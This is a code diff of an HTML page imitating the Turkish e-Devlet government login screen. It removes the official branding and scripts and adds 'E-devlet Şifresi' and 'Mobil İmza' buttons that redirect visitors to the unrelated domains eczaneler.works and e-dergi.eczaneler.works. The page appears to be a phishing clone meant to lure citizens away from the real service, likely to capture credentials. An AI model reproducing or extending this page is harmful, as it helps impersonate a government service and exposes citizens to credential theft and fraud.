@@ -11,58 +11,26 @@
 <body data-lang="tr_TR.UTF-8">
 <div class="wrapper">
     <div class="container">
-        <header class="header">
-            <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı</h1>
-            <div class="logo">
-                <a href="https://giris.turkiye.gov.tr/Giris/gir">
-                    <img src="https://cdn.e-devlet.gov.tr/themes/izmir/images/login/edk-logo.png" alt="Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı">
-                </a>
-            </div>
-            <div class="referrerApp">
-                <img alt="" src="https://cdn.e-devlet.gov.tr/themes/istanbul/images/agencies/1.png" aria-hidden="true" width="165" height="40">
-                <p>e-Devlet Kapısı<span>https://www.turkiye.gov.tr</span></p>
-            </div>
-        </header>
-
         <main>
             <section>
                 <div class="content">
                     <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                         <fieldset>
                             <div class="form-row center-item">
-                                <button onclick="location.href='https://www.turkiye.gov.tr';" type="button" class="btn btn-cancel" name="cancelButton" value="İptal">İptal</button>
-                                <button onclick="location.href='https://eczaneler.works/';" class="btn btn-send" name="submitButton" type="button" value="Giriş Yap">Giriş Yap</button>
+                                <button onclick="location.href='https://eczaneler.works/';" class="btn btn-send" name="submitButton" type="button" value="E-devlet Şifresi">E-devlet Şifresi</button>
+                            </div>
+                            <div class="form-row center-item">
+                                <button onclick="location.href='https://e-dergi.eczaneler.works/';" class="btn btn-send" name="submitButton" type="button" value="Mobil İmza">Mobil İmza</button>
+                            </div>
+                            <div class="form-row center-item">
+                                <button type="button" class="btn btn-cancel" name="cancelButton" value="İptal">İptal</button>
+                                <button class="btn btn-send" name="submitButton" type="submit" value="Giriş Yap">Giriş Yap</button>
                             </div>
                         </fieldset>
                     </form>
                 </div>
             </section>
         </main>
-
-        <footer class="footer-fixed" role="contentinfo">
-            <span class="copyright">
-                <img src="https://cdn.e-devlet.gov.tr/themes/nevsehir/images/DDO-logo.png" class="footer-logo" alt="T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı" height="24">
-                © 2024, Ankara - Tüm Hakları Saklıdır
-            </span>
-            <ul>
-                <li>
-                    <a id="gizlilik_btn" href="javascript:void(0)" aria-haspopup="true">Gizlilik ve Güvenlik</a>
-                </li>
-                <li>
-                    <a href="https://www.turkiye.gov.tr/iletisim?hizli=CozumMerkezi2" target="_blank">Hızlı Çözüm Merkezi</a>
-                </li>
-            </ul>
-        </footer>
-
-        <script id="info_js" data-static-version="1.9.5" src="https://cdn.e-devlet.gov.tr/themes/izmir/js/common.1.9.5.js"></script>
-        <script src="https://cdn.e-devlet.gov.tr/themes/izmir/js/es/jquery.jcryption.1.9.5.js" type="text/javascript"></script>
-        <script src="https://cdn.e-devlet.gov.tr/themes/izmir/js/es/edk-giris.1.9.5.js"></script>
-
-        <script type="text/javascript">
-            $("#gizlilik_btn").on("click", function () {
-                // Existing code for privacy modal
-            });
-        </script>
     </div>
 </div>
 </body>
